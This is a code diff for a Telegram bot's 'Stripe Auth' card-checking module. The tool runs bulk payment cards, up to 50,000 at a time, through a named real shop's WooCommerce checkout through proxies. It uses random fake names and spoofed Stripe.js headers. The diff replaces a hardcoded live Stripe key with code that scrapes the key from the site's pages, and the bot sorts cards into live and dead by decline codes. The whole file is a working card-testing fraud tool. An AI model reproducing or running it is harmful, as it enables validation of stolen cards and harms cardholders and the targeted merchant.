@@ -10,9 +10,10 @@ from telethon import events, Button
 
 # ─── CONFIG ────────────────────────────────────────────────────────────────────
 STRIPE_SITE = "https://shop.nemaneide.com"
-STRIPE_PK   = "pk_live_51ROOSi03FG8Au2CBvmO4o6DP0qA0RZrRrfZOnaBDsGPJGmufqblXi5kMzp8RwDVwaKd8ggjdazNJV7X72tBgnoFs00BuEsszoz"
 STRIPE_API  = "https://api.stripe.com/v1"
 MAX_CARDS   = 50000
+
+_cached_pk  = None  # auto-scraped from site, cached after first fetch
 
 # ─── LIVE DECLINE CODES (card exists, bank blocked) ────────────────────────────
 _LIVE_CODES = {
@@ -83,17 +84,50 @@ def _random_name():
     last  = random.choice(['Smith', 'Brown', 'Jones', 'Davis', 'Wilson'])
     return first, last
 
+# ─── PK SCRAPER ────────────────────────────────────────────────────────────────
+async def _scrape_pk(session, proxy):
+    """Scrape Stripe publishable key from site checkout/homepage."""
+    global _cached_pk
+    if _cached_pk:
+        return _cached_pk
+
+    _pk_patterns = [
+        r'["\']?(pk_live_[A-Za-z0-9]{20,})["\']?',
+        r'["\']?(pk_test_[A-Za-z0-9]{20,})["\']?',
+    ]
+
+    urls_to_try = [
+        f'{STRIPE_SITE}/checkout/',
+        f'{STRIPE_SITE}/',
+        f'{STRIPE_SITE}/shop/',
+    ]
+
+    for url in urls_to_try:
+        try:
+            async with session.get(
+                url, headers=_BROWSER_HEADERS, proxy=proxy,
+                timeout=aiohttp.ClientTimeout(total=12), allow_redirects=True
+            ) as resp:
+                text = await resp.text()
+            for pat in _pk_patterns:
+                m = re.search(pat, text)
+                if m:
+                    _cached_pk = m.group(1)
+                    return _cached_pk
+        except Exception:
+            continue
+    return None
+
 # ─── CORE STRIPE FUNCTIONS ──────────────────────────────────────────────────────
-async def _create_payment_method(session, cc, mes, ano, cvv, proxy):
+async def _create_payment_method(session, cc, mes, ano, cvv, pk, proxy):
     """Tokenize card with Stripe publishable key → PaymentMethod ID"""
     first, last = _random_name()
     guid      = str(uuid.uuid4())
     muid      = str(uuid.uuid4())
     sid       = str(uuid.uuid4())
     card_hash = uuid.uuid4().hex[:16]
-    # Requests must appear to originate from Stripe.js's own iframe (js.stripe.com)
     headers = {
-        'Authorization': f'Bearer {STRIPE_PK}',
+        'Authorization': f'Bearer {pk}',
         'Content-Type': 'application/x-www-form-urlencoded',
         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
         'Origin': 'https://js.stripe.com',
@@ -140,11 +174,9 @@ async def _get_product_id(session, proxy):
             timeout=aiohttp.ClientTimeout(total=12), allow_redirects=True
         ) as resp:
             text = await resp.text()
-        # Find add-to-cart data attributes
         matches = re.findall(r'data-product_id="(\d+)"', text)
         if matches:
             return matches[0]
-        # Fallback: find from product links
         links = re.findall(r'\?add-to-cart=(\d+)', text)
         return links[0] if links else None
     except Exception:
@@ -153,7 +185,6 @@ async def _get_product_id(session, proxy):
 async def _setup_cart_and_get_pi(session, proxy):
     """Add product to cart, go to checkout, get PaymentIntent client secret"""
     try:
-        # Add to cart
         product_id = await _get_product_id(session, proxy)
         if product_id:
             async with session.get(
@@ -163,7 +194,6 @@ async def _setup_cart_and_get_pi(session, proxy):
             ) as resp:
                 pass
 
-        # Get checkout page
         async with session.get(
             f'{STRIPE_SITE}/checkout/',
             headers=_BROWSER_HEADERS, proxy=proxy,
@@ -171,7 +201,6 @@ async def _setup_cart_and_get_pi(session, proxy):
         ) as resp:
             checkout_text = await resp.text()
 
-        # Extract nonce
         nonce = None
         for pattern in [
             r'"createPaymentIntentNonce"\s*:\s*"([^"]+)"',
@@ -186,7 +215,6 @@ async def _setup_cart_and_get_pi(session, proxy):
         if not nonce:
             return None
 
-        # Request PaymentIntent from WooCommerce AJAX
         ajax_headers = {
             **_BROWSER_HEADERS,
             'Content-Type': 'application/x-www-form-urlencoded',
@@ -213,14 +241,14 @@ async def _setup_cart_and_get_pi(session, proxy):
     except Exception:
         return None
 
-async def _confirm_pi(session, client_secret, pm_id, proxy):
+async def _confirm_pi(session, client_secret, pm_id, pk, proxy):
     """Confirm PaymentIntent → returns (status, message)"""
     pi_id = client_secret.split('_secret_')[0]
     first, last = _random_name()
     headers = {
-        'Authorization': f'Bearer {STRIPE_PK}',
+        'Authorization': f'Bearer {pk}',
         'Content-Type': 'application/x-www-form-urlencoded',
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
         'Origin': STRIPE_SITE,
         'Referer': f'{STRIPE_SITE}/checkout/',
         'Stripe-Version': '2023-10-16',
@@ -270,32 +298,37 @@ async def stripe_auth(card, proxy_str=None):
     """Check a single card via Stripe auth. Returns dict with status/message/card."""
     parsed = _parse_card(card)
     if not parsed:
-        return {'status': 'Dead', 'message': 'Invalid format', 'card': card, 'gateway': 'Stripe'}
+        return {'status': 'Dead', 'message': 'Invalid format', 'card': card, 'gateway': 'Stripe Auth'}
     cc, mes, ano, cvv = parsed
     proxy = _parse_proxy(proxy_str)
 
     connector = aiohttp.TCPConnector(ssl=False, force_close=True)
     try:
         async with aiohttp.ClientSession(connector=connector) as session:
+            # Step 0: Get PK from site
+            pk = await _scrape_pk(session, proxy)
+            if not pk:
+                return {'status': 'Error', 'message': 'Could not scrape Stripe PK from site', 'card': card, 'gateway': 'Stripe Auth'}
+
             # Step 1: Tokenize
-            pm_id, pm_err = await _create_payment_method(session, cc, mes, ano, cvv, proxy)
+            pm_id, pm_err = await _create_payment_method(session, cc, mes, ano, cvv, pk, proxy)
             if not pm_id:
                 if any(c in str(pm_err) for c in _DEAD_CODES):
-                    return {'status': 'Dead', 'message': pm_err, 'card': card, 'gateway': 'Stripe'}
-                return {'status': 'Dead', 'message': pm_err or 'Tokenization failed', 'card': card, 'gateway': 'Stripe'}
+                    return {'status': 'Dead', 'message': pm_err, 'card': card, 'gateway': 'Stripe Auth'}
+                return {'status': 'Dead', 'message': pm_err or 'Tokenization failed', 'card': card, 'gateway': 'Stripe Auth'}
 
             # Step 2: Get PaymentIntent
             client_secret = await _setup_cart_and_get_pi(session, proxy)
             if not client_secret:
-                return {'status': 'Error', 'message': 'Could not get Payment Intent', 'card': card, 'gateway': 'Stripe'}
+                return {'status': 'Error', 'message': 'Could not get Payment Intent', 'card': card, 'gateway': 'Stripe Auth'}
 
             # Step 3: Confirm
-            status, message = await _confirm_pi(session, client_secret, pm_id, proxy)
+            status, message = await _confirm_pi(session, client_secret, pm_id, pk, proxy)
             return {'status': status, 'message': message, 'card': card, 'gateway': 'Stripe Auth'}
     finally:
         await connector.close()
 
-# ─── BOT HANDLERS (call register_handlers(bot) from new_bot.py when ready) ─────
+# ─── BOT HANDLERS ──────────────────────────────────────────────────────────────
 def register_handlers(bot, is_premium_fn, is_owner_fn, load_proxies_fn):
 
     @bot.on(events.NewMessage(pattern=r'^/st(\s|$)'))
@@ -370,13 +403,7 @@ def register_handlers(bot, is_premium_fn, is_owner_fn, load_proxies_fn):
             parse_mode='html'
         )
 
-        # progress message
-        prog_msg = await bot.send_message(
-            user_id,
-            "🔄 Checking...",
-            parse_mode='html'
-        )
-
+        prog_msg = await bot.send_message(user_id, "🔄 Checking...", parse_mode='html')
         _stop = [False]
 
         @bot.on(events.CallbackQuery(data=b'st_stop'))
@@ -425,7 +452,6 @@ def register_handlers(bot, is_premium_fn, is_owner_fn, load_proxies_fn):
         tasks = [_check_one(c, i+1) for i, c in enumerate(cards)]
         await asyncio.gather(*tasks)
 
-        # Final summary
         elapsed  = int(time.time() - results['start'])
         h, rem   = divmod(elapsed, 3600)
         m, s     = divmod(rem, 60)
